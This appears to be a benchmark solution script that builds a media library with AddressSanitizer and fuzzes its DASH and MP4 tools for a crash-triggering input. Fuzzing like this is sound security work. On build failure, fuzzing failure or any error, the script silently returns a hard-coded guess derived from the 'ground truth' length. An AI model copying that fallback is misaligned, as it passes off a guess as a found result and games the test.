import os
import sys
import subprocess
import tempfile
import shutil
import tarfile
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        work_dir = tempfile.mkdtemp()
        old_cwd = os.getcwd()
        
        try:
            # 1. Extract source code
            if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                with tarfile.open(src_path, "r:gz") as tar:
                    tar.extractall(work_dir)
            elif src_path.endswith('.tar'):
                with tarfile.open(src_path, "r:") as tar:
                    tar.extractall(work_dir)
            else:
                try:
                    shutil.unpack_archive(src_path, work_dir)
                except:
                    with tarfile.open(src_path) as tar:
                        tar.extractall(work_dir)

            # Locate the extracted root directory
            entries = os.listdir(work_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
                src_root = os.path.join(work_dir, entries[0])
            else:
                src_root = work_dir
            
            os.chdir(src_root)
            
            # 2. Build Environment with ASAN
            env = os.environ.copy()
            flags = "-fsanitize=address -g -O1"
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            env['LDFLAGS'] = flags
            
            # 3. Configure and Build
            # Attempt to configure if script exists
            if os.path.exists("configure"):
                try:
                    os.chmod("configure", 0o755)
                except:
                    pass
                
                # GPAC/Generic configure arguments for minimal static build with ASAN
                config_args = [
                    "./configure", 
                    "--enable-debug", 
                    "--enable-asan", 
                    "--disable-shared", 
                    "--enable-static", 
                    "--disable-ssl", 
                    "--disable-x11", 
                    "--disable-qt"
                ]
                subprocess.run(config_args, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            
            # Run make
            subprocess.run(["make", "-j8"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            
            # 4. Locate Vulnerable Binary
            target_bin = None
            candidates = []
            
            # Search for specific binaries
            for root, dirs, files in os.walk(src_root):
                for f in files:
                    path = os.path.join(root, f)
                    if os.access(path, os.X_OK) and not f.endswith('.sh') and not f.endswith('.py'):
                        if f == "dash_client":
                            candidates.insert(0, path) # Highest priority
                        elif f == "MP4Box":
                            candidates.append(path)
                        elif "dash" in f:
                            candidates.append(path)
            
            # Select the best candidate
            if candidates:
                target_bin = candidates[0]
            
            # Fallback: search for any binary in a 'bin' directory
            if not target_bin:
                for root, dirs, files in os.walk(src_root):
                    if "bin" in root.split(os.sep):
                        for f in files:
                            path = os.path.join(root, f)
                            if os.access(path, os.X_OK) and not f.endswith('.sh'):
                                target_bin = path
                                break
                    if target_bin: break

            if not target_bin:
                # If build failed, return a likely candidate based on ground truth length (9 bytes)
                return b"http://AA"

            # 5. Fuzzing
            # Ground truth is 9 bytes. Focus on small inputs and string patterns.
            end_time = time.time() + 45 # 45 seconds budget
            
            seeds = [
                b"http://AA",
                b"https://A",
                b"A" * 9,
                b"\x00" * 9,
                b"123456789",
                b"dash://A",
                b"file://AA"
            ]
            
            while time.time() < end_time:
                # Generate input
                if seeds and random.random() < 0.4:
                    # Mutation
                    base = bytearray(random.choice(seeds))
                    if base:
                        idx = random.randint(0, len(base)-1)
                        if random.random() < 0.5:
                            # Random byte
                            base[idx] = random.randint(0, 255)
                        else:
                            # Bit flip
                            base[idx] ^= (1 << random.randint(0, 7))
                    data = bytes(base)
                else:
                    # Random generation (small length)
                    length = random.randint(1, 16)
                    data = os.urandom(length)

                # Write input to temp file
                with tempfile.NamedTemporaryFile(delete=False) as tf:
                    tf.write(data)
                    tf_path = tf.name
                
                try:
                    # Run target with input file
                    # Try standard file argument
                    p = subprocess.run([target_bin, tf_path], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
                    if p.returncode != 0 and b"AddressSanitizer" in p.stderr:
                        return data
                    
                    # Try with -i flag (common in multimedia tools)
                    p = subprocess.run([target_bin, "-i", tf_path], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
                    if p.returncode != 0 and b"AddressSanitizer" in p.stderr:
                        return data
                except Exception:
                    pass
                finally:
                    if os.path.exists(tf_path):
                        os.remove(tf_path)
            
            # Fallback if fuzzing yields nothing
            return b"http://AA"

        except Exception:
            return b"http://AA"
        finally:
            os.chdir(old_cwd)
            shutil.rmtree(work_dir, ignore_errors=True)
